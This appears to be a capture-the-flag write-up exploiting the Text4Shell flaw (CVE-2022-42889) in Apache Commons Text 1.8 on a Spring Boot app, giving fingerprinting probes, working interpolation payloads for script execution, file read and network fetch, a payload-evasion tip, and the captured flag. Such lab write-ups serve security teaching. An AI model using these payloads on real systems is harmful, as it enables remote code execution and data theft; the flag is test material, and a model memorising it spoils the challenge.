# Fan Signal Lab — CVE (350 pts)

Target: `http://54.72.82.22:8220`

## Product + version

| Item | Value |
|---|---|
| Framework | Spring Boot fat jar (`/app/app.jar`, `java -jar app.jar`) |
| Runtime | Java 1.8.0_504 (OpenJDK; Nashorn JS engine present) |
| Vulnerable lib | **Apache Commons Text 1.8** — `BOOT-INF/lib/commons-text-1.8.jar` |
| Container | Docker (`.dockerenv`), app user `appuser`, workdir `/app` |

### Fingerprinting evidence
- Error bodies are Spring Boot JSON: `{"timestamp":…,"status":404,"error":"Not Found","message":"No message available","path":…}`; no `Server`/`X-Powered-By` header is emitted.
- Sink: `GET /home?message=<value>` returns `Text Received: <value>`.
- Interpolation probe → `?message=${java:version}` returned `Java version 1.8.0_504`; `${sys:user.dir}` → `/app`; `${env:PATH}` → container PATH. So the value is run through `StringSubstitutor.replace(...)`.
- Exact build resolved without trusting any note: probed `BOOT-INF/lib/commons-text-<v>.jar` entries via the script lookup →
  `1.5=false 1.6=false 1.7=false 1.8=true 1.9=false 1.10.0=false` → **1.8**.
  (The blurb's "neighboring version" note names a sibling build; the running build is 1.8, not the neighbor.)

## Advisory

**CVE-2022-42889 — "Text4Shell"** (Apache Commons Text string interpolation RCE).
Affects 1.5–1.9; fixed in 1.10.0. In 1.5–1.9 the *default* interpolator set still
includes the dangerous lookups `script`, `dns` and `url`, reachable from any
untrusted string fed to `StringSubstitutor.replace`. CVE score 9.8.
- `${script:javascript:<expr>}` → executes via Nashorn → arbitrary Java / RCE.
- `${file:UTF-8:<path>}` → arbitrary file read.
- `${url:UTF-8:<url>}` → SSRF/network read.

## Sink

`GET /home?message=` — "the smallest note sets the mood"; the `message` field is
interpolated. Confirmed live: `${script:javascript:1+1}` → `2`.

## Exploit

1. Directory listing (Nashorn): `new java.io.File("/app").list()` → `[flag, app.jar]`.
2. Read flag via file lookup: `?message=${file:UTF-8:/app/flag}`.

```
GET /home?message=${file:UTF-8:/app/flag}
→ Text Received: safctf{e5ca75a4e6e0507f9dd29be81997b9b6}
```

## Flag

```
safctf{e5ca75a4e6e0507f9dd29be81997b9b6}
```

No `/submit` stage on this task (`POST /submit` → 404); the flag is returned
directly by the app.

## Gotcha

Commons Text's `script:` lookup parser balances braces, so a payload containing
literal `{`/`}` (e.g. a JS `while(…){}` body or IIFE) fails to resolve and is echoed
verbatim. Use brace-free payloads — Java calls, ternaries, `!=null`/`==null`, or
`${file:…}` — or an IIFE-free expression.

## Files
- `solve.py` — reproducible exploit, prints the flag.
